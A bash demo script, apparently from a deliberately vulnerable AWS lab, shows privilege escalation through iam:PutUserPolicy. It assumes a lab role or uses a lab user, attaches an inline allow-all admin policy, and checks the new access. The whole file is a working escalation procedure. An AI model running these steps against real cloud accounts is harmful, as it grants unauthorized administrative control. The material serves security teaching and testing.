#!/bin/bash

# Demo script for iam:PutUserPolicy privilege escalation
# This script demonstrates how a principal with PutUserPolicy permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
PRIVESC_ROLE="pl-pup-adam"
PRIVESC_USER="pl-pup-user"
INLINE_POLICY_NAME="EscalatedAdminPolicy"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PutUserPolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Ask user which path to demonstrate
echo -e "${YELLOW}Choose attack path:${NC}"
echo "1. Role-based (assume pl-pup-adam role)"
echo "2. User-based (use pl-pup-user credentials)"
read -p "Enter choice (1 or 2): " choice

if [ "$choice" == "1" ]; then
    # Role-based attack path
    echo -e "\n${GREEN}Using role-based attack path${NC}\n"

    # Step 1: Verify starting user identity
    echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
    CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
    echo "Current identity: $CURRENT_USER"

    if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
        echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
        echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
        exit 1
    fi
    echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

    # Step 2: Get account ID
    echo -e "${YELLOW}Step 2: Getting account ID${NC}"
    ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
    echo "Account ID: $ACCOUNT_ID"
    echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

    # Step 3: Assume the privilege escalation role
    echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
    ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
    echo "Role ARN: $ROLE_ARN"

    CREDENTIALS=$(aws sts assume-role \
        --role-arn $ROLE_ARN \
        --role-session-name demo-attack-session \
        --profile $PROFILE \
        --query 'Credentials' \
        --output json)

    export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

    # Verify we're now the role
    ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
    echo "Current identity: $ROLE_IDENTITY"
    echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

    # We'll put the policy on the starting user (since we can't put policies on assumed roles)
    TARGET_USER=$STARTING_USER

elif [ "$choice" == "2" ]; then
    # User-based attack path
    echo -e "\n${GREEN}Using user-based attack path${NC}"
    echo -e "${YELLOW}Note: You need to configure the pl-pup-user credentials first${NC}\n"

    # Get the user credentials from Terraform output
    echo -e "${YELLOW}Step 1: Getting user credentials from Terraform output${NC}"
    echo "Run these commands to get the credentials:"
    echo "terraform output -raw prod_one_hop_to_admin_iam_putuserpolicy[0].user_access_key_id"
    echo "terraform output -raw prod_one_hop_to_admin_iam_putuserpolicy[0].user_secret_access_key"
    echo ""
    read -p "Press enter once you have configured aws profile 'pl-pup-user' with these credentials..."

    # Use the user credentials
    export AWS_PROFILE="pl-pup-user"
    TARGET_USER=$PRIVESC_USER

    # Verify identity
    echo -e "${YELLOW}Verifying identity as $PRIVESC_USER${NC}"
    USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
    echo "Current identity: $USER_IDENTITY"

    if [[ ! $USER_IDENTITY == *"$PRIVESC_USER"* ]]; then
        echo -e "${RED}Error: Not running as $PRIVESC_USER${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Verified user identity${NC}\n"

    # Get account ID
    ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
    echo "Account ID: $ACCOUNT_ID"

else
    echo -e "${RED}Invalid choice${NC}"
    exit 1
fi

# Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list S3 buckets (should fail)..."
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: Unexpected permissions${NC}"
fi
echo ""

# Step 5: Perform privilege escalation via PutUserPolicy
echo -e "${YELLOW}Step 5: Escalating privileges via iam:PutUserPolicy${NC}"
echo "Attaching inline admin policy to user: $TARGET_USER"
echo "This is the privilege escalation vector..."

# Create the admin policy document
ADMIN_POLICY=$(cat <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF
)

# Attach the inline policy to the user
aws iam put-user-policy \
    --user-name $TARGET_USER \
    --policy-name $INLINE_POLICY_NAME \
    --policy-document "$ADMIN_POLICY"

echo -e "${GREEN}✓ Successfully attached inline admin policy!${NC}\n"

# For role-based attack, we need to re-authenticate as the user to use the new policy
if [ "$choice" == "1" ]; then
    echo -e "${YELLOW}Step 6: Re-authenticating as the escalated user${NC}"
    echo "Note: Since we put the policy on the starting user, we need to switch back to that user"

    # Clear the assumed role credentials
    unset AWS_ACCESS_KEY_ID
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN

    # Use the original profile
    export AWS_PROFILE=$PROFILE
fi

# Step 7: Verify admin access
echo -e "${YELLOW}Step 7: Verifying administrator access with escalated permissions${NC}"
ESCALATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ESCALATED_IDENTITY"

# Test admin permissions
echo "Testing admin permissions (listing IAM users)..."
IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
echo "Successfully listed IAM users: $IAM_USERS"

echo "Testing S3 access (previously denied)..."
if aws s3 ls 2>&1 | head -5; then
    echo -e "${GREEN}✓ Can now list S3 buckets!${NC}"
else
    echo -e "${YELLOW}S3 listing still restricted (may need a moment for policy to propagate)${NC}"
fi

echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"

if [ "$choice" == "1" ]; then
    echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
    echo -e "Step 1: Assumed role ${YELLOW}$PRIVESC_ROLE${NC}"
    echo -e "Step 2: Used PutUserPolicy to attach admin policy to ${YELLOW}$STARTING_USER${NC}"
    echo -e "Step 3: Switched back to ${YELLOW}$STARTING_USER${NC} with admin access"
    echo ""
    echo -e "${YELLOW}Attack Path:${NC}"
    echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE → (PutUserPolicy) → $STARTING_USER → Admin"
else
    echo -e "Starting Point: User ${YELLOW}$PRIVESC_USER${NC}"
    echo -e "Step 1: Used PutUserPolicy to attach admin policy to self"
    echo -e "Step 2: Gained ${RED}Administrator Access${NC}"
    echo ""
    echo -e "${YELLOW}Attack Path:${NC}"
    echo -e "  $PRIVESC_USER → (PutUserPolicy on self) → Admin"
fi

echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the inline policy${NC}"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""